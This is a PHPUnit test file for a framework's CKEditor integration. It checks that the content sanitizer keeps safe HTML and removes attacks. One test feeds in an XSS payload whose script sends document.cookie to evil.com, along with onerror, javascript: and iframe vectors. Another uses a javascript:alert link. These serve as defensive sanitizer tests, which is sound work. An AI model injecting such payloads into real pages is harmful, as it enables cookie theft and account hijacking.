<?php

namespace Canvastack\Canvastack\Tests\Feature\Components\Form\Features\Editor;

use Canvastack\Canvastack\Components\Form\Features\Editor\CKEditorIntegration;
use Canvastack\Canvastack\Components\Form\Features\Editor\ContentSanitizer;
use Canvastack\Canvastack\Components\Form\Features\Editor\EditorConfig;
use Canvastack\Canvastack\Components\Form\Support\AssetManager;
use PHPUnit\Framework\TestCase;

/**
 * Feature Tests for CKEditor Complete Workflow.
 *
 * Tests end-to-end workflows including:
 * - Complete content creation flow
 * - Content preservation during validation
 * - Sanitization on save
 *
 * **Validates: Requirements 4.14, 4.15**
 */
class CKEditorWorkflowTest extends TestCase
{
    protected CKEditorIntegration $integration;

    protected EditorConfig $config;

    protected ContentSanitizer $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();

        $this->config = new EditorConfig();
        $this->sanitizer = new ContentSanitizer();
        $this->integration = new CKEditorIntegration(
            $this->config,
            $this->sanitizer,
            new AssetManager()
        );
    }

    /**
     * @test
     * Test complete content creation workflow
     *
     * Simulates the full lifecycle:
     * 1. User opens form with CKEditor
     * 2. User types content
     * 3. User submits form
     * 4. Content is sanitized
     * 5. Content is saved
     *
     * Requirements: 4.1, 4.15
     */
    public function it_handles_complete_content_creation_workflow(): void
    {
        // Step 1: Initialize editor (form load)
        $this->integration->register('article_content', [
            'height' => 400,
            'toolbar' => $this->config->getDefaultToolbar(),
        ]);

        $this->assertTrue($this->integration->isRegistered('article_content'));

        // Step 2: Simulate user input (content editing)
        $userContent = <<<HTML
        <h2>Article Title</h2>
        <p>This is the <strong>introduction</strong> paragraph with a <a href="https://example.com">link</a>.</p>
        <ul>
            <li>First point</li>
            <li>Second point</li>
        </ul>
        <p>Conclusion paragraph with <em>emphasis</em>.</p>
        HTML;

        // Step 3: Form submission - sanitize content
        $sanitizedContent = $this->integration->sanitize($userContent);

        // Step 4: Verify sanitized content
        $this->assertNotEmpty($sanitizedContent);

        // Assert: Safe HTML is preserved
        $this->assertStringContainsString('<h2>', $sanitizedContent);
        $this->assertStringContainsString('Article Title', $sanitizedContent);
        $this->assertStringContainsString('<strong>', $sanitizedContent);
        $this->assertStringContainsString('<a href', $sanitizedContent);
        $this->assertStringContainsString('<ul>', $sanitizedContent);
        $this->assertStringContainsString('<li>', $sanitizedContent);
        $this->assertStringContainsString('<em>', $sanitizedContent);

        // Step 5: Content is ready to be saved to database
        $this->assertGreaterThan(0, strlen($sanitizedContent));
    }

    /**
     * @test
     * Test content preservation during validation errors
     *
     * Simulates:
     * 1. User submits form with validation error
     * 2. Form is re-rendered with errors
     * 3. User's content is preserved in editor
     *
     * Requirements: 4.14
     */
    public function it_preserves_content_during_validation_errors(): void
    {
        // Step 1: Initial form load
        $this->integration->register('content', []);

        // Step 2: User enters content
        $originalContent = '<p>User typed this content before validation error.</p>';

        // Step 3: Form submission with validation error
        // (In real scenario, Laravel's old() helper would store this)

        // Step 4: Form re-render - editor should be re-initialized
        $this->integration->clear();
        $this->integration->register('content', []);

        // Step 5: Content should be available for restoration
        // (In real scenario, this would come from old() helper)
        $preservedContent = $originalContent;

        // Assert: Content can be sanitized and restored
        $sanitized = $this->integration->sanitize($preservedContent);
        $this->assertStringContainsString('User typed this content', $sanitized);
    }

    /**
     * @test
     * Test sanitization removes malicious content on save
     *
     * Simulates attack scenario:
     * 1. Attacker submits form with XSS payload
     * 2. Content is sanitized before save
     * 3. Malicious code is removed
     * 4. Safe content is preserved
     *
     * Requirements: 4.15, 14.8
     */
    public function it_sanitizes_malicious_content_on_save(): void
    {
        // Step 1: Initialize editor
        $this->integration->register('content', []);

        // Step 2: Attacker submits malicious content
        $maliciousContent = <<<HTML
        <p>Legitimate content</p>
        <script>
            // Steal cookies
            fetch('https://evil.com/steal?cookie=' + document.cookie);
        </script>
        <img src="x" onerror="alert('XSS')">
        <a href="javascript:void(0)" onclick="malicious()">Click me</a>
        <iframe src="https://evil.com/phishing"></iframe>
        HTML;

        // Step 3: Sanitize before save
        $sanitizedContent = $this->integration->sanitize($maliciousContent);

        // Step 4: Verify malicious code is removed
        $this->assertStringNotContainsString('<script>', $sanitizedContent);
        $this->assertStringNotContainsString('fetch(', $sanitizedContent);
        $this->assertStringNotContainsString('document.cookie', $sanitizedContent);
        $this->assertStringNotContainsString('onerror', $sanitizedContent);
        $this->assertStringNotContainsString('onclick', $sanitizedContent);
        $this->assertStringNotContainsString('javascript:', $sanitizedContent);
        $this->assertStringNotContainsString('<iframe>', $sanitizedContent);

        // Step 5: Verify safe content is preserved
        $this->assertStringContainsString('Legitimate content', $sanitizedContent);
    }

    /**
     * @test
     * Test workflow with multiple editors
     *
     * Simulates form with multiple content fields:
     * 1. Initialize multiple editors
     * 2. User edits multiple fields
     * 3. Submit and sanitize all content
     *
     * Requirements: 4.22, 4.15
     */
    public function it_handles_workflow_with_multiple_editors(): void
    {
        // Step 1: Initialize multiple editors (e.g., blog post form)
        $this->integration->register('title', [
            'height' => 150,
            'toolbar' => $this->config->getMinimalToolbar(),
        ]);

        $this->integration->register('content', [
            'height' => 400,
            'toolbar' => $this->config->getDefaultToolbar(),
        ]);

        $this->integration->register('excerpt', [
            'height' => 200,
            'toolbar' => $this->config->getMinimalToolbar(),
        ]);

        $this->assertEquals(3, $this->integration->count());

        // Step 2: User enters content in all fields
        $titleContent = '<h1>My Blog Post Title</h1>';
        $mainContent = '<p>This is the main content with <strong>formatting</strong>.</p>';
        $excerptContent = '<p>Short excerpt for preview.</p>';

        // Step 3: Sanitize all content on submission
        $sanitizedTitle = $this->integration->sanitize($titleContent);
        $sanitizedMain = $this->integration->sanitize($mainContent);
        $sanitizedExcerpt = $this->integration->sanitize($excerptContent);

        // Step 4: Verify all content is sanitized correctly
        $this->assertStringContainsString('My Blog Post Title', $sanitizedTitle);
        $this->assertStringContainsString('main content', $sanitizedMain);
        $this->assertStringContainsString('Short excerpt', $sanitizedExcerpt);

        // All content should be safe
        $this->assertStringNotContainsString('<script>', $sanitizedTitle);
        $this->assertStringNotContainsString('<script>', $sanitizedMain);
        $this->assertStringNotContainsString('<script>', $sanitizedExcerpt);
    }

    /**
     * @test
     * Test workflow with image upload
     *
     * Simulates:
     * 1. Initialize editor with upload support
     * 2. User uploads image
     * 3. Image is embedded in content
     * 4. Content with image is sanitized
     *
     * Requirements: 4.7, 4.8, 4.15
     */
    public function it_handles_workflow_with_image_upload(): void
    {
        // Step 1: Initialize editor with upload URL
        $this->integration->register('content', [
            'uploadUrl' => '/admin/upload/image',
            'height' => 400,
        ]);

        $this->assertTrue($this->integration->isRegistered('content'));

        // Step 2: Simulate content with uploaded image
        $contentWithImage = <<<HTML
        <p>Article introduction.</p>
        <img src="/uploads/images/photo.jpg" alt="Uploaded photo" width="600" height="400">
        <p>Article continues after image.</p>
        HTML;

        // Step 3: Sanitize content with image
        $sanitizedContent = $this->integration->sanitize($contentWithImage);

        // Step 4: Verify image is preserved with safe attributes
        $this->assertStringContainsString('<img', $sanitizedContent);
        $this->assertStringContainsString('src=', $sanitizedContent);
        $this->assertStringContainsString('alt=', $sanitizedContent);
        $this->assertStringContainsString('photo.jpg', $sanitizedContent);

        // Verify text content is preserved
        $this->assertStringContainsString('Article introduction', $sanitizedContent);
        $this->assertStringContainsString('Article continues', $sanitizedContent);
    }

    /**
     * @test
     * Test workflow with table content
     *
     * Requirements: 4.15, 4.17
     */
    public function it_handles_workflow_with_table_content(): void
    {
        // Step 1: Initialize editor
        $this->integration->register('content', []);

        // Step 2: User creates table
        $tableContent = <<<HTML
        <p>Data table:</p>
        <table border="1" cellpadding="5">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Value</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td>Item 1</td>
                    <td>100</td>
                </tr>
                <tr>
                    <td>Item 2</td>
                    <td>200</td>
                </tr>
            </tbody>
        </table>
        HTML;

        // Step 3: Sanitize table content
        $sanitizedContent = $this->integration->sanitize($tableContent);

        // Step 4: Verify table structure is preserved
        $this->assertStringContainsString('<table', $sanitizedContent);
        $this->assertStringContainsString('<thead>', $sanitizedContent);
        $this->assertStringContainsString('<tbody>', $sanitizedContent);
        $this->assertStringContainsString('<tr>', $sanitizedContent);
        $this->assertStringContainsString('<th>', $sanitizedContent);
        $this->assertStringContainsString('<td>', $sanitizedContent);
        $this->assertStringContainsString('Item 1', $sanitizedContent);
        $this->assertStringContainsString('100', $sanitizedContent);
    }

    /**
     * @test
     * Test workflow with lists and formatting
     *
     * Requirements: 4.15
     */
    public function it_handles_workflow_with_lists_and_formatting(): void
    {
        // Step 1: Initialize editor
        $this->integration->register('content', []);

        // Step 2: User creates formatted content with lists
        $formattedContent = <<<HTML
        <h2>Features</h2>
        <ul>
            <li><strong>Bold feature</strong></li>
            <li><em>Italic feature</em></li>
            <li><u>Underlined feature</u></li>
        </ul>
        <h2>Steps</h2>
        <ol>
            <li>First step</li>
            <li>Second step</li>
            <li>Third step</li>
        </ol>
        <blockquote>
            <p>This is a quote.</p>
        </blockquote>
        HTML;

        // Step 3: Sanitize content
        $sanitizedContent = $this->integration->sanitize($formattedContent);

        // Step 4: Verify all formatting is preserved
        $this->assertStringContainsString('<h2>', $sanitizedContent);
        $this->assertStringContainsString('<ul>', $sanitizedContent);
        $this->assertStringContainsString('<ol>', $sanitizedContent);
        $this->assertStringContainsString('<li>', $sanitizedContent);
        $this->assertStringContainsString('<strong>', $sanitizedContent);
        $this->assertStringContainsString('<em>', $sanitizedContent);
        $this->assertStringContainsString('<u>', $sanitizedContent);
        $this->assertStringContainsString('<blockquote>', $sanitizedContent);
        $this->assertStringContainsString('Bold feature', $sanitizedContent);
        $this->assertStringContainsString('This is a quote', $sanitizedContent);
    }

    /**
     * @test
     * Test workflow with links
     *
     * Requirements: 4.15
     */
    public function it_handles_workflow_with_links(): void
    {
        // Step 1: Initialize editor
        $this->integration->register('content', []);

        // Step 2: User adds various types of links
        $contentWithLinks = <<<HTML
        <p>Check out <a href="https://example.com" title="Example Site">this website</a>.</p>
        <p>Email us at <a href="mailto:info@example.com">info@example.com</a>.</p>
        <p>Internal link: <a href="/about">About Us</a>.</p>
        HTML;

        // Step 3: Sanitize content
        $sanitizedContent = $this->integration->sanitize($contentWithLinks);

        // Step 4: Verify safe links are preserved
        $this->assertStringContainsString('<a href', $sanitizedContent);
        $this->assertStringContainsString('https://example.com', $sanitizedContent);
        $this->assertStringContainsString('mailto:info@example.com', $sanitizedContent);
        $this->assertStringContainsString('/about', $sanitizedContent);
        $this->assertStringContainsString('this website', $sanitizedContent);

        // Verify dangerous link protocols are removed
        $dangerousLinks = '<a href="javascript:alert(1)">Click</a>';
        $sanitizedDangerous = $this->integration->sanitize($dangerousLinks);
        $this->assertStringNotContainsString('javascript:', $sanitizedDangerous);
    }

    /**
     * @test
     * Test workflow with context switching
     *
     * Requirements: 4.11, 4.12
     */
    public function it_handles_workflow_with_context_switching(): void
    {
        // Scenario: Admin editing content, then public user viewing

        // Step 1: Admin context - full editor
        $this->integration->setContext('admin');
        $this->integration->register('admin_content', [
            'toolbar' => $this->config->getFullToolbar(),
        ]);

        $adminContent = '<p>Admin created <strong>content</strong> with full toolbar.</p>';
        $sanitizedAdmin = $this->integration->sanitize($adminContent);

        // Step 2: Public context - minimal editor
        $this->integration->setContext('public');
        $this->integration->register('public_content', [
            'toolbar' => $this->config->getMinimalToolbar(),
        ]);

        $publicContent = '<p>Public user <strong>comment</strong>.</p>';
        $sanitizedPublic = $this->integration->sanitize($publicContent);

        // Step 3: Verify both contexts work correctly
        $this->assertStringContainsString('Admin created', $sanitizedAdmin);
        $this->assertStringContainsString('Public user', $sanitizedPublic);
        $this->assertEquals(2, $this->integration->count());
    }

    /**
     * @test
     * Test workflow with dark mode
     *
     * Requirements: 4.13
     */
    public function it_handles_workflow_with_dark_mode(): void
    {
        // Step 1: Enable dark mode
        $this->integration->setDarkMode(true);

        // Step 2: Register editor
        $this->integration->register('content', []);

        // Step 3: Verify dark mode is applied
        $instance = $this->integration->getInstance('content');
        $this->assertTrue($instance['darkMode']);

        // Step 4: Content sanitization works the same regardless of dark mode
        $content = '<p>Content in <strong>dark mode</strong>.</p>';
        $sanitized = $this->integration->sanitize($content);

        $this->assertStringContainsString('dark mode', $sanitized);
        $this->assertStringContainsString('<strong>', $sanitized);
    }
}
